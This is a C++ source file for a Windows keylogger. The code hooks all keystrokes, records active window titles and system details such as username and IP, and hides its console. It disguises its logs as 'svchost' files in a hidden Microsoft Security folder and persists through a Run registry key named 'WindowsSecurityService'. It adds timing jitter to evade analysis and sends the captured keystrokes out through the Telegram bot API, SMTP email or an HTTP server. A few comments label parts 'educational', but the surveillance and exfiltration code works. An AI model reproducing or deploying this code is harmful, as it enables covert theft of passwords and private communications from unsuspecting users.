/**
 * @file KeyLogger.cpp
 * @brief Implementation of the KeyLogger class
 */

#include "../include/KeyLogger.h"
#include "../include/SmtpClient.h"

#include <iostream>
#include <sstream>
#include <Lmcons.h>
#include <ShlObj.h>
#include <direct.h>

// For IP address resolution
#include <winsock2.h>
#include <ws2tcpip.h>

#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>
#include <sstream>
#include <map>
#include <WinInet.h>
#include <random>
#include <chrono>
#include <TlHelp32.h>

#pragma comment(lib, "wininet.lib")

// Static member for singleton pattern
KeyLogger* KeyLogger::instance = nullptr;

// Static keyboard hook callback
LRESULT CALLBACK KeyLogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KeyLogger* logger = KeyLogger::getInstance();
        if (logger) {
            logger->logKey(((KBDLLHOOKSTRUCT*)lParam)->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Telegram-based constructor
KeyLogger::KeyLogger(
    const std::string& telegramToken,
    const std::string& telegramChat,
    int interval
) : isRunning(false), logInterval(interval), useTelegram(true),
    useProcessHollowing(false), usePolymorphicCode(false), emailClient(nullptr)
{
    // Initialize Telegram configuration
    telegramBotToken = telegramToken;
    telegramChatId = telegramChat;
    
    // Common initialization
    // Initialize special keys mapping
    initSpecialKeys();
    
    // Create directory structure
    createDirectoryStructure();
    
    // Generate timestamp-based filename with some randomization for stealth
    auto now = std::chrono::system_clock::now();
    auto now_time = std::chrono::system_clock::to_time_t(now);
    struct tm* timeinfo = localtime(&now_time);
    char buffer[80];
    strftime(buffer, 80, "%Y%m%d-%H%M%S", timeinfo);
    
    // Add some randomness to filenames to make them harder to detect
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(100, 999);
    int random_suffix = dis(gen);
    
    // Create log file
    logFileName = logDirectory + "svchost_" + buffer + "_" + std::to_string(random_suffix) + ".log";
    logFile.open(logFileName, std::ios::app);
    
    lastReportTime = time(0);
    
    // Set up the singleton instance
    instance = this;
    
    // Log system info at startup
    logSystemInfo();
    
    // Send initial message to Telegram
    std::string initialMsg = "Keylogger started on " + std::string(buffer);
    sendLogsToTelegram(initialMsg);
}

// Legacy email-based constructor
KeyLogger::KeyLogger(
    const std::string& email, 
    const std::string& password, 
    const std::string& smtp,
    int port,
    int interval
) : isRunning(false), logInterval(interval), useTelegram(false),
    useProcessHollowing(false), usePolymorphicCode(false)
{
    // Initialize special keys mapping
    initSpecialKeys();
    
    // Create directory structure
    createDirectoryStructure();
    
    // Generate timestamp-based filename
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    char buffer[80];
    strftime(buffer, 80, "%Y%m%d-%H%M%S", timeinfo);
    
    // Create log file
    logFileName = logDirectory + "svchost_" + buffer + ".log";
    logFile.open(logFileName, std::ios::app);
    
    lastReportTime = time(0);
    
    // Create SMTP client for email reporting
    emailClient = new SmtpClient(smtp, port, email, password);
    emailAddress = email;
    
    // Set up the singleton instance
    instance = this;
    
    // Log system info at startup
    logSystemInfo();
}

// Destructor
KeyLogger::~KeyLogger() {
    stop();
    if (logFile.is_open()) {
        logFile.close();
    }
    if (emailClient) {
        delete emailClient;
    }
}

// Get singleton instance
KeyLogger* KeyLogger::getInstance() {
    return instance;
}

// Start the keylogger
bool KeyLogger::start(bool hideConsole, bool addStartup, bool useProcessHollow) {
    if (isRunning) return true;
    
    // Store process hollowing flag
    useProcessHollowing = useProcessHollow;
    
    // Add random delay for evasion (anti-analysis)
    sleepWithJitter(2000);
    
    // Add to startup for persistence
    if (addStartup) {
        addToStartup("WindowsSecurityService");
    }
    
    // Hide the console window if requested
    if (hideConsole) {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }
    
    // NOTE: Process hollowing is mentioned here for educational purposes but not fully implemented
    // Process hollowing would involve:
    // 1. Creating a suspended process
    // 2. Unmapping its memory
    // 3. Writing our code to its address space
    // 4. Resuming the process
    if (useProcessHollowing) {
        // This is a simplified educational version - not actual hollowing
        logFile << "[EDUCATIONAL] Process hollowing would be used here." << std::endl;
        
        // In a real implementation, we might inject into an existing process
        // but that's not appropriate for this educational context
    }
    
    // Set up low-level keyboard hook
    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        GetModuleHandle(NULL),
        0
    );
    
    if (!keyboardHook) {
        return false;
    }
    
    isRunning = true;
    
    // Start a thread to check timing for reports
    CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
        KeyLogger* logger = (KeyLogger*)param;
        while (logger->isRunning) {
            time_t now = time(0);
            if (difftime(now, logger->lastReportTime) >= logger->logInterval) {
                if (logger->useTelegram) {
                    // Read the log file content
                    std::ifstream file(logger->logFileName, std::ios::binary);
                    if (file.is_open()) {
                        std::string content(
                            (std::istreambuf_iterator<char>(file)),
                            std::istreambuf_iterator<char>()
                        );
                        file.close();
                        
                        // Send to Telegram
                        logger->sendLogsToTelegram(content);
                    }
                } else {
                    // Use legacy email method
                    logger->sendLogsToEmail();
                }
                logger->lastReportTime = now;
            }
            Sleep(1000); // Check every second
        }
        return 0;
    }, this, 0, NULL);
    
    return true;
}

// Log a key press
void KeyLogger::logKey(int vkCode) {
    std::string currentWindow = getActiveWindowTitle();
    static std::string lastWindow = "";
    
    if (currentWindow != lastWindow) {
        time_t now = time(0);
        struct tm* timeinfo = localtime(&now);
        char buffer[80];
        strftime(buffer, 80, "\n[%Y-%m-%d %H:%M:%S]", timeinfo);
        
        logFile << std::endl << buffer << " Window: " << currentWindow << std::endl;
        lastWindow = currentWindow;
    }
    
    // Check for special keys
    auto it = specialKeys.find(vkCode);
    if (it != specialKeys.end()) {
        logFile << it->second;
    } else {
        // Handle regular characters
        BYTE keyState[256] = {0};
        GetKeyboardState(keyState);
        
        // Check for shift key
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        
        // Get the character from the virtual key code
        char buffer[5] = {0};
        int result = ToAscii(vkCode, 0, keyState, (LPWORD)buffer, 0);
        
        if (result == 1) {
            char keyChar = buffer[0];
            // Apply shift if needed
            if (!shift && keyChar >= 'A' && keyChar <= 'Z') {
                keyChar = tolower(keyChar);
            }
            logFile << keyChar;
        }
    }
    
    // Flush to ensure data is written immediately
    logFile.flush();
}

// Initialize special key mappings
void KeyLogger::initSpecialKeys() {
    specialKeys[VK_SPACE] = " ";
    specialKeys[VK_RETURN] = "[ENTER]\n";
    specialKeys[VK_SHIFT] = "[SHIFT]";
    specialKeys[VK_BACK] = "[BACKSPACE]";
    specialKeys[VK_TAB] = "[TAB]";
    specialKeys[VK_CONTROL] = "[CTRL]";
    specialKeys[VK_MENU] = "[ALT]";
    specialKeys[VK_ESCAPE] = "[ESC]";
    specialKeys[VK_DELETE] = "[DEL]";
    specialKeys[VK_UP] = "[UP]";
    specialKeys[VK_DOWN] = "[DOWN]";
    specialKeys[VK_LEFT] = "[LEFT]";
    specialKeys[VK_RIGHT] = "[RIGHT]";
    specialKeys[VK_CAPITAL] = "[CAPS]";
    specialKeys[VK_SNAPSHOT] = "[PRTSCR]";
    specialKeys[VK_INSERT] = "[INS]";
    specialKeys[VK_HOME] = "[HOME]";
    specialKeys[VK_END] = "[END]";
    specialKeys[VK_PRIOR] = "[PGUP]";
    specialKeys[VK_NEXT] = "[PGDN]";
    specialKeys[VK_F1] = "[F1]";
    specialKeys[VK_F2] = "[F2]";
    specialKeys[VK_F3] = "[F3]";
    specialKeys[VK_F4] = "[F4]";
    specialKeys[VK_F5] = "[F5]";
    specialKeys[VK_F6] = "[F6]";
    specialKeys[VK_F7] = "[F7]";
    specialKeys[VK_F8] = "[F8]";
    specialKeys[VK_F9] = "[F9]";
    specialKeys[VK_F10] = "[F10]";
    specialKeys[VK_F11] = "[F11]";
    specialKeys[VK_F12] = "[F12]";
}

// Get active window title
std::string KeyLogger::getActiveWindowTitle() {
    char title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, title, sizeof(title));
    return title;
}

// Add program to startup - ensures persistence after reboot
void KeyLogger::addToStartup(const std::string& appName) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    
    char filename[MAX_PATH];
    GetModuleFileNameA(NULL, filename, MAX_PATH);
    
    RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (const BYTE*)filename, strlen(filename));
    RegCloseKey(hKey);
}

// Create the necessary directory structure
void KeyLogger::createDirectoryStructure() {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    
    // Create a hidden directory for logs
    logDirectory = std::string(appDataPath) + "\\Microsoft\\Windows\\Security\\Logs\\";
    
    // Create directories recursively
    std::string tempPath = logDirectory;
    for (size_t i = 0; i < tempPath.size(); i++) {
        if (tempPath[i] == '\\') {
            std::string subdir = tempPath.substr(0, i);
            if (!subdir.empty()) {
                _mkdir(subdir.c_str());
            }
        }
    }
    _mkdir(tempPath.c_str());
    
    // Set directory attributes to hidden
    SetFileAttributesA(logDirectory.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

// Add jitter to sleep times to avoid pattern detection
void KeyLogger::sleepWithJitter(int baseMs) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(-150, 150);
    int jitter = dis(gen);
    Sleep(baseMs + jitter);
}

// Encrypt data with XOR using emoji keys (educational)
std::string KeyLogger::encryptData(const std::string& data) {
    // Simple XOR encryption with emoji Unicode values
    // This is for educational purposes - not secure encryption
    const unsigned char keys[] = {0xF0, 0x9F, 0x94, 0x92, 0xF0, 0x9F, 0x94, 0x93}; // 🔒🔓 emojis
    std::string encrypted;
    
    for (size_t i = 0; i < data.length(); i++) {
        encrypted += data[i] ^ keys[i % sizeof(keys)];
    }
    
    return encrypted;
}

// Send logs to email (legacy method)
bool KeyLogger::sendLogsToEmail() {
    if (!logFile.is_open() || !emailClient) {
        return false;
    }
    
    // Close the file to flush any pending writes
    logFile.close();
    
    // Open the file for reading
    std::ifstream file(logFileName, std::ios::binary);
    if (!file.is_open()) {
        // Reopen for writing
        logFile.open(logFileName, std::ios::app);
        return false;
    }
    
    // Read the file content
    std::string content(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );
    
    file.close();
    
    // Generate a date string for the subject
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    char buffer[80];
    strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
    
    // Create attachment
    SmtpClient::Attachment attachment;
    attachment.filename = "keylog.txt";
    attachment.content = content;
    attachment.contentType = "text/plain";
    
    std::vector<SmtpClient::Attachment> attachments;
    attachments.push_back(attachment);
    
    // Create email subject
    std::string computerName;
    char computer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computer_len = MAX_COMPUTERNAME_LENGTH + 1;
    if (GetComputerNameA(computer, &computer_len)) {
        computerName = computer;
    } else {
        computerName = "Unknown";
    }
    
    std::string subject = "Keylog Report from " + computerName + " - " + buffer;
    
    // Send the email
    bool success = emailClient->sendEmail(
        emailAddress,
        emailAddress,
        subject,
        "Keylogger report attached.",
        attachments
    );
    
    // Reopen the file for writing
    logFile.open(logFileName, std::ios::app);
    
    return success;
}

// Send logs to Telegram
bool KeyLogger::sendLogsToTelegram(const std::string& logData) {
    // Skip if not configured
    if (telegramBotToken.empty() || telegramChatId.empty()) {
        return false;
    }
    
    // Prepare the message - truncate if too long
    std::string message = logData;
    if (message.length() > 4000) {
        message = message.substr(message.length() - 4000);
        message = "...(truncated)...\n" + message;
    }
    
    // Encrypt the data (educational demonstration)
    // Note: This is not real security - just showing concepts
    std::string encryptedData = encryptData(message);
    
    // URL-encode the message
    std::string encodedMessage = urlEncode(message);
    
    // Construct the API URL
    std::string url = "/bot" + telegramBotToken + "/sendMessage?chat_id=" + telegramChatId + "&text=" + encodedMessage;
    
    // Add jitter to avoid timing patterns
    sleepWithJitter(100);
    
    // Initialize WinInet
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    // Connect to Telegram API
    HINTERNET hConnect = InternetConnectA(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Send the request
    bool result = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
    
    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result;
}

// Send logs to backend server
bool KeyLogger::sendLogsToServer(const std::string& logData, const std::string& windowTitle) {
    // Set your API credentials here (from devices page on dashboard)
    std::string serverUrl = "http://localhost:5000/api/keylogs/data";
    std::string apiKey = "your_device_api_key"; // Fill this in from the dashboard
    std::string deviceId = "your_device_id";    // Fill this in from the dashboard
    
    // Don't try to send if not configured
    if (apiKey == "your_device_api_key" || deviceId == "your_device_id") {
        return false;
    }
    
    // Prepare the POST data
    std::string postData = "apiKey=" + apiKey + 
                          "&deviceId=" + deviceId + 
                          "&logData=" + urlEncode(logData) + 
                          "&windowTitle=" + urlEncode(windowTitle);
    
    // Initialize WinInet
    HINTERNET hInternet = InternetOpenA("KeyLogger/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }
    
    // Open a connection to the server
    HINTERNET hConnection = InternetConnectA(hInternet, "localhost", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnection) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Create an HTTP request
    HINTERNET hRequest = HttpOpenRequestA(hConnection, "POST", "/api/keylogs/data", NULL, NULL, NULL, 0, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnection);
        InternetCloseHandle(hInternet);
        return false;
    }
    
    // Set request headers
    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    HttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), HTTP_ADDREQ_FLAG_ADD);
    
    // Send the request
    bool success = HttpSendRequestA(hRequest, NULL, 0, (LPVOID)postData.c_str(), postData.length());
    
    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);
    
    return success;
}

// URL encode a string
std::string KeyLogger::urlEncode(const std::string& str) {
    std::string encoded;
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else if (c == ' ') {
            encoded += '+';
        } else {
            char buf[4];
            snprintf(buf, sizeof(buf), "%%%02X", static_cast<unsigned char>(c));
            encoded += buf;
        }
    }
    return encoded;
}

// Log system information
void KeyLogger::logSystemInfo() {
    logFile << "=== System Information ===" << std::endl;
    
    // Get username
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserNameA(username, &username_len);
    logFile << "Username: " << username << std::endl;
    
    // Get computer name
    char computer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computer_len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computer, &computer_len);
    logFile << "Computer: " << computer << std::endl;
    
    // Get Windows version
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    #pragma warning(disable:4996)
    GetVersionExA(&osvi);
    logFile << "Windows: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << " (Build " << osvi.dwBuildNumber << ")" << std::endl;
    
    // Get IP address
    char hostName[256];
    gethostname(hostName, sizeof(hostName));
    struct hostent* host = gethostbyname(hostName);
    if (host) {
        struct in_addr addr;
        addr.s_addr = *(u_long*)host->h_addr_list[0];
        logFile << "IP Address: " << inet_ntoa(addr) << std::endl;
    }
    
    logFile << "==========================" << std::endl << std::endl;
}

// Stop the keylogger
void KeyLogger::stop() {
    if (!isRunning) return;
    
    // Unhook the keyboard
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
    
    isRunning = false;
    
    // Send final report
    if (useTelegram) {
        // Read the log file content
        std::ifstream file(logFileName, std::ios::binary);
        if (file.is_open()) {
            std::string content(
                (std::istreambuf_iterator<char>(file)),
                std::istreambuf_iterator<char>()
            );
            file.close();
            
            // Send to Telegram
            sendLogsToTelegram("Final report: " + content);
        }
    } else {
        sendLogsToEmail();
    }
} 